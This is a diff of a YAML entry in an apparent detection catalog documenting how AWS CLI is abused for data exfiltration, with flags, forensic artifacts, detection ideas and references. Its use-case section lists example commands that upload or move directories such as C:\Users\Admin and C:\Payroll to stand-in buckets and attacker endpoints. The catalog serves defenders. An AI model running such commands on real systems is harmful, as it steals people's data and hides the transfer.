@@ -1,95 +1,118 @@
 Name: AWS CLI
-Description: Official command-line tool by Amazon Web Services used to manage AWS infrastructure. Supports file transfer to S3 via cp, mv, and sync commands, and has been abused for data exfiltration by ransomware groups.
+Description: >
+  Official command-line tool by Amazon Web Services used to manage AWS
+  infrastructure. Supports file transfer to S3 via cp, mv, and sync commands, and
+  has been abused for data exfiltration by ransomware groups.
 Category: cloud-based
 Platform:
-  - Windows
-  - Linux
-  - macOS
+- Windows
+- Linux
+- macOS
 Execution:
-  - cli
+- cli
 Capabilities:
-  - file-transfer
-  - authenticated-upload
-  - recursive-upload
-  - quiet-execution
-  - endpoint-spoofing
-  - credentialed-access
-Stealth:
-  - quiet-flag
-  - custom-endpoint
-  - anonymous-upload
-  - background-execution
+- file-transfer #Core AWS CLI function; allows uploading data to S3 using cp, mv, or sync.
+- authenticated-upload # Supports IAM credentials, role-based access, or tokens (SigV4), tying upload to an identity.
+- recursive-upload #--recursive enables full directory trees to be uploaded, which is typical in bulk exfiltration.
+- quiet-execution #--quiet suppresses output; often used to reduce logging or hide exfil behavior in shells/scripts.
+- endpoint-spoofing #--endpoint-url allows using custom S3-compatible endpoints (e.g., attacker-controlled or S3 Accelerate).
+- credentialed-access # Requires credentials unless SAS or anonymous access is used; implies elevated access if misused.
+- anonymous-upload # Can be used with publicly writable buckets or pre-signed URLs with no authentication.
+- background-execution # AWS CLI can be executed silently by scripts, scheduled tasks, or malware loaders (non-interactive usage).
 Forensics:
   BinaryLocations:
-    - C:\Program Files\Amazon\AWSCLIV2\aws.exe
-    - C:\Program Files (x86)\Amazon\AWSCLI\bin\aws.exe
-    - USERPROFILE\AppData\Local\Programs\Python\Python39\Scripts\aws.exe
-    - /usr/local/bin/aws
-    - /usr/bin/aws
-    - ~/.local/bin/aws
+  - C:\Program Files\Amazon\AWSCLIV2\aws.exe
+  - C:\Program Files (x86)\Amazon\AWSCLI\bin\aws.exe
+  - USERPROFILE\AppData\Local\Programs\Python\Python39\Scripts\aws.exe
+  - /usr/local/bin/aws
+  - /usr/bin/aws
+  - ~/.local/bin/aws
   FileNamePatterns:
-    - aws\.exe
-    - aws\.cmd
-    - aws
+  - aws\.exe
+  - aws
   CommandLineArgs:
-    - s3 cp
-    - s3 mv
-    - s3 sync
-    - --recursive
-    - --quiet
-    - --endpoint-url
-    - --exclude
-    - --include
+    Description: These are the most common flags that have been observed to be used by threat actors in the wild.
+    Indicators:
+    - s3 cp              # Copies files to S3. Commonly used by ransomware actors for basic exfiltration. [1][2]
+    - s3 mv              # Same as cp, but removes source files after upload. Used for trace reduction. [1]
+    - s3 sync            # Recursively synchronizes local and remote folders; efficient for large bulk exfiltration. [2]
+    - --recursive        # Ensures all nested files/folders are included in exfiltration, including hidden/subdirs. [3]
+    - --quiet            # Suppresses CLI output; reduces terminal evidence or logs in PowerShell history. [2]
+    - --endpoint-url   # Used to specify S3 Transfer Acceleration or attacker-controlled endpoints. Example aws s3 cp myfile.txt https://malicious-domain[.]com --endpoint-url [1]
+    - --exclude          # Allows attacker to skip unnecessary files, avoiding noise or large file sizes. [3]
+    - --include          # Enables targeting of specific file types (e.g., *.pdf, *.docx) for selective exfiltration. [3]"
   NetworkArtifacts:
-    - TLS traffic to *.s3.amazonaws.com
-    - API calls to s3-accelerate.amazonaws.com
-    - Authenticated HTTPS PUT/POST requests
+    Description: Detectable traffic patterns related to AWS CLI file transfers.
+    Indicators:
+    - '*.s3.amazonaws.com'
+    - 's3-accelerate.amazonaws.com'
   ConfigFiles:
-    - C:\Users\<username>\.aws\credentials
-    - ~/.aws/credentials
-  ScheduledTask: []
-  RegistryPersistence: []
-Tags:
-  - cloud-based
-  - commonly-used
-  - stealth
-  - remote-execution
+  - C:\Users\<username>\.aws\credentials
+  - ~/.aws/credentials
+  RegistryPersistence: []  # AWS CLI does not natively persist via registry
+  LogFiles: []  # No default log files generated
+  ScheduledTask: []  # CLI is not scheduled by default unless abused in automation
 ThreatActors:
-  - ransomware
-  - apt
+- ransomware
+- apt
 UseCases:
-  - Title: Standard copy to S3
-    Description: Copies a local file or directory to an S3 bucket using cp and recursive flags.
+  - Title: Basic directory exfiltration
+    Description: Copies a full directory to an S3 bucket using the `cp` command with the `--recursive` flag. Common in ransomware and APT campaigns for bulk exfiltration of documents and sensitive files.
     Command: aws s3 cp C:\Data s3://exfil-bucket/ --recursive
 
-  - Title: Silent exfiltration using quiet mode
-    Description: Executes the same copy operation but suppresses output for stealth.
+  - Title: Stealthy exfiltration with quiet mode
+    Description: Executes a recursive file upload while suppressing all CLI output using `--quiet`. This reduces visibility in logs or command history and is often used in script-based or automated exfiltration.
     Command: aws s3 cp /tmp/data s3://bucket-name/ --recursive --quiet
 
-  - Title: Use of custom S3 endpoint (accelerated or obfuscated)
-    Description: Uploads data using S3 Transfer Acceleration or a custom endpoint to evade detection.
-    Command: aws s3 cp data.txt https://redacted.s3-accelerate.amazonaws.com --endpoint-url
+  - Title: Exfiltration via custom or accelerated endpoint
+    Description: Uses `--endpoint-url` to redirect uploads through a non-standard endpoint such as S3 Transfer Acceleration or an attacker-controlled S3-compatible service. This can help bypass domain-based detections and increase upload speed.
+    Command: aws s3 cp data.txt https://malicious-s3[.]domain --endpoint-url
 
-  - Title: Filtered upload of specific file types
-    Description: Uploads only selected files from a directory using --include and --exclude filters.
+  - Title: Selective file exfiltration using filters
+    Description: Uploads only targeted file types (e.g., `.pdf`, `.docx`) using a combination of `--include` and `--exclude` flags. Useful for minimizing upload size and avoiding irrelevant files.
     Command: aws s3 cp /reports s3://leakdump/ --recursive --include "*.pdf" --exclude "*"
 
-  - Title: Move (delete after upload)
-    Description: Exfiltrates files and deletes local copies using `mv`.
+  - Title: Trace-removal via move operation
+    Description: Transfers files using the `mv` command, which removes local copies after successful upload. This technique is used to cover tracks and reduce forensic evidence.
     Command: aws s3 mv C:\Sensitive s3://hidden-bucket/ --recursive
 
+  - Title: Full backup of compromised system
+    Description: Synchronizes the entire system or user profile directory with a remote S3 bucket using `s3 sync`. This allows attackers to maintain persistence over stolen data even if access is later revoked.
+    Command: aws s3 sync C:\Users\Admin s3://backup-bucket/
+
+  - Title: Obfuscation with benign bucket names
+    Description: Uploads to buckets with non-suspicious names (e.g., `finance-backups`, `system-logs`) to blend in with legitimate activity or evade basic alert rules.
+    Command: aws s3 cp C:\Payroll s3://finance-backups/ --recursive
 Detection:
   - Type: Anomalous Endpoint Usage
-    Description: Create a low-severity detection for AWS CLI uploads to uncommon or non-standard S3 endpoints, such as non-default regions or S3 Transfer Acceleration URLs.
-
-  - Type: Behavioral Correlation
-    Description: Correlate anomalous S3 endpoint usage with other suspicious events (e.g., privilege escalation, credential access, compression utilities) to identify multi-stage exfiltration campaigns.
-
-  - Type: Process Anomaly
-    Description: Generate alerts when the AWS CLI process is spawned by non-interpreter parents such as malware, implants, or remote management tools, indicating potential automated exfiltration.
+    Description: >
+      Detect AWS CLI connections to rarely used or non-default S3 endpoints such as `s3-accelerate.amazonaws.com`
+      or custom S3-compatible domains. These may be used to evade standard monitoring or increase upload speed.
 
   - Type: Command-Line Abuse
-    Description: Flag the use of the `--endpoint-url` argument with suspicious hostnames or IPs outside of approved enterprise infrastructure, which may indicate redirection to attacker-controlled storage.
+    Description: >
+      Alert on suspicious use of CLI flags such as `--quiet`, `--recursive`, or combined use of `--include` and `--exclude`,
+      particularly when combined with `mv` (which deletes local files post-upload).
 
-LastModified: "2025-10-20"
+  - Type: Suspicious Parent Process
+    Description: >
+      Detect AWS CLI execution triggered by uncommon parent processes (e.g., `mshta`, `wmic`, `powershell`, `office`),
+      which may indicate abuse through malware loaders or LOLBINs.
 
+  - Type: Credential Misuse + Exfil Behavior
+    Description: >
+      Correlate AWS CLI usage with prior credential access events, token use, or suspicious archive creation
+      to detect multi-stage exfiltration workflows.
+
+  - Type: Snapshot Abuse via AWS CLI
+    Description: >
+      Monitor for snapshot creation or backup activity linked to credential misuse or suspicious timing.
+      This has been used by ransomware actors for data theft and extortion.
+    Sigma: https://github.com/SigmaHQ/sigma/blob/master/rules/cloud/aws/cloudtrail/aws_snapshot_backup_exfiltration.yml
+Testig:
+  - https://hackingthe.cloud/aws/post_exploitation/download_tools_and_exfiltrate_data_with_aws_cli/
+References:
+- 1. https://thedfirreport.com/2022/10/17/icedid-to-dagon-ransomware/
+- 2. https://hackingthe.cloud/aws/post_exploitation/download_tools_and_exfiltrate_data_with_aws_cli/
+- 3. https://docs.aws.amazon.com/cli/latest/reference/s3/
+LastModified: '2025-10-20'
